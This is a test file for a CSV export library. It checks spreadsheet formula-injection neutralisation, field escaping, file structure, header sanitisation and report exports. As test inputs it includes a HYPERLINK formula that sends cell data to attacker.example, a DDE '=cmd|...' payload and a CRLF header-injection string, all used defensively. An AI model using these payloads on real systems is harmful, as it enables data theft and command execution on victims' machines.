import { describe, expect, it } from 'vitest';
import {
  toCsv,
  escapeCsvField,
  neutraliseFormula,
  csvFilename,
  contentDispositionFor,
} from '@/lib/export/csv';
import { renderExport, availableExports } from '@/lib/export/reports';

/**
 * CSV export safety.
 *
 * Every cell in these files is text taken verbatim from a third-party web page,
 * and the file is opened in a spreadsheet on a customer's machine. That makes
 * this one of the few places in the product where a bug reaches outside the
 * browser sandbox entirely.
 */

describe('formula injection', () => {
  /**
   * Excel, Sheets and LibreOffice all evaluate a cell that begins with one of
   * these. Quoting does not help — the character is inside the quotes and the
   * spreadsheet evaluates it anyway — so the value has to be prefixed.
   */
  it.each([
    ['=HYPERLINK("https://attacker.example?d="&A1,"Click me")', '='],
    ['+1+1', '+'],
    ['-2+3', '-'],
    ['@SUM(A1:A9)', '@'],
    ['\tcmd', '\t'],
    ['\rcmd', '\r'],
  ])('neutralises a cell starting with %s', (payload) => {
    const result = neutraliseFormula(payload);
    expect(result.startsWith("'")).toBe(true);
    // The value stays readable; it just stops being executable.
    expect(result.slice(1)).toBe(payload);
  });

  it('leaves ordinary text alone', () => {
    for (const value of ['Acme Ltd', '£49 per month', 'a=b', '100', 'Smith & Co']) {
      expect(neutraliseFormula(value)).toBe(value);
    }
  });

  it('protects a formula inside a full document, not just in isolation', () => {
    const csv = toCsv(
      [{ name: '=cmd|"/c calc"!A1', site: 'https://x.example' }],
      [
        { header: 'Name', value: (r) => r.name },
        { header: 'Site', value: (r) => r.site },
      ],
    );

    // The dangerous cell is both quoted (it contains a quote) and prefixed.
    expect(csv).toContain('"\'=cmd|""/c calc""!A1"');
    expect(csv).not.toContain(',=cmd');
  });
});

describe('RFC 4180 escaping', () => {
  it.each([
    ['plain', 'plain'],
    ['with,comma', '"with,comma"'],
    ['with"quote', '"with""quote"'],
    ['with\nnewline', '"with\nnewline"'],
    ['with\r\ncrlf', '"with\r\ncrlf"'],
    ['', ''],
  ])('escapes %s', (input, expected) => {
    expect(escapeCsvField(input)).toBe(expected);
  });

  it('renders null and undefined as empty rather than as text', () => {
    expect(escapeCsvField(null)).toBe('');
    expect(escapeCsvField(undefined)).toBe('');
    // The alternative is a column full of the word "null", which people then
    // filter on.
    expect(escapeCsvField(0)).toBe('0');
    expect(escapeCsvField(false)).toBe('false');
  });

  it('joins arrays rather than rendering [object Object]', () => {
    // Semicolon-separated, so the joined value needs no quoting of its own —
    // which is exactly why a semicolon was chosen over a comma.
    expect(escapeCsvField(['a', 'b'])).toBe('a; b');
    expect(escapeCsvField(['a,1', 'b'])).toBe('"a,1; b"');
  });
});

describe('document structure', () => {
  const rows = [
    { rank: 1, name: 'Alpha', site: 'https://alpha.example' },
    { rank: 2, name: 'Beta, Inc', site: 'https://beta.example' },
  ];
  const columns = [
    { header: 'Rank', value: (r: (typeof rows)[number]) => r.rank },
    { header: 'Name', value: (r: (typeof rows)[number]) => r.name },
    { header: 'Website', value: (r: (typeof rows)[number]) => r.site },
  ];

  it('leads with a UTF-8 BOM so Excel on Windows reads accents correctly', () => {
    const csv = toCsv(rows, columns);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
  });

  it('uses CRLF line endings and a header row', () => {
    const csv = toCsv(rows, columns);
    const lines = csv.slice(1).split('\r\n');

    expect(lines[0]).toBe('Rank,Name,Website');
    expect(lines[1]).toBe('1,Alpha,https://alpha.example');
    expect(lines[2]).toBe('2,"Beta, Inc",https://beta.example');
  });

  it('keeps column order stable, since people build formulas against it', () => {
    const first = toCsv(rows, columns).split('\r\n')[0];
    const second = toCsv([], columns).split('\r\n')[0];
    expect(first).toBe(second);
  });

  it('emits a header row even with no data', () => {
    expect(toCsv([], columns)).toContain('Rank,Name,Website');
  });
});

describe('filenames and headers', () => {
  it('slugifies the subject and dates the file', () => {
    expect(csvFilename('Acme Consulting Ltd.', 'leads', '2026-08-23T21:00:00.000Z')).toBe(
      'acme-consulting-ltd-leads-2026-08-23.csv',
    );
  });

  it('survives a subject with nothing usable in it', () => {
    expect(csvFilename('...', 'leads', '2026-08-23T00:00:00.000Z')).toBe(
      'research-leads-2026-08-23.csv',
    );
  });

  /**
   * The filename is derived from user-supplied text and goes into a response
   * header. A header value that can contain a newline is a header-injection
   * bug.
   */
  it('strips quotes and newlines from the Content-Disposition header', () => {
    const header = contentDispositionFor('evil"\r\nX-Injected: yes.csv');
    expect(header).toBe('attachment; filename="evilX-Injected: yes.csv"');
    expect(header).not.toContain('\r');
    expect(header).not.toContain('\n');
  });
});

describe('report exports', () => {
  const sources = [
    {
      ref: 'S1',
      position: 1,
      url: 'https://alpha.example/pricing',
      title: 'Pricing',
      publisherDomain: 'alpha.example',
      retrievedAt: '2026-08-23T00:00:00.000Z',
      fetched: true,
    },
  ];

  const report = {
    competitors: [
      {
        id: 'alpha',
        rank: 1,
        name: 'Alpha',
        website: 'https://alpha.example',
        type: 'direct',
        whyRanked: 'Same buyer, same market',
        confidence: 'high',
        offering: 'Consulting',
        audience: 'Mid-market',
        positioning: 'Premium',
        marketingMessage: 'Expertise you can trust',
        pricing: {
          value: null,
          basis: 'unavailable',
          confidence: 'low',
          sources: [],
          note: null,
        },
        strengths: [
          {
            statement: 'Publishes case studies',
            basis: 'measured',
            confidence: 'high',
            sources: ['S1'],
          },
        ],
        weaknesses: [
          {
            statement: 'No pricing published',
            basis: 'measured',
            confidence: 'high',
            sources: ['S1'],
          },
        ],
        trustSignals: [],
        reviewThemes: [],
        battlecard: {
          theirPitch: 'p',
          whereTheyWin: 'w',
          whereYouWin: 'y',
          objectionToExpect: 'o',
          yourResponse: 'r',
        },
        sources: ['S1'],
      },
    ],
  };

  it('lists only the sections a report actually contains', () => {
    expect(availableExports(report)).toEqual(['competitors']);
    expect(availableExports({ leads: [], creators: [] })).toEqual([]);
    expect(availableExports(null)).toEqual([]);
  });

  it('returns null rather than an empty file for a missing section', () => {
    expect(renderExport('leads', report, sources)).toBeNull();
    expect(renderExport('influencers', report, sources)).toBeNull();
  });

  it('resolves citations to real URLs, so the export keeps its evidence', () => {
    const csv = renderExport('competitors', report, sources)!;
    expect(csv).toContain('https://alpha.example/pricing');
  });

  it('says "not publicly available" rather than leaving pricing blank', () => {
    // An empty cell reads as "we did not look". This one reads as "we looked".
    expect(renderExport('competitors', report, sources)!).toContain(
      'Not publicly available',
    );
  });
});
